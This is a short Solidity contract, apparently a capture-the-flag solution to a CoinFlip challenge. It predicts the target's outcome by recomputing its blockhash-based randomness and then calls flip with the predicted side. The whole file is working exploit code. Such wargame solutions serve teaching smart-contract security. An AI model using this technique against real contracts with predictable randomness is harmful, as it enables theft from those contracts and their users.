// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract Solve {
    CoinFlip target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _address) {
        target = CoinFlip(_address);
    }

    function run() public {
        uint256 lastHash;
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) revert();
        
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        target.flip(side);
    }
}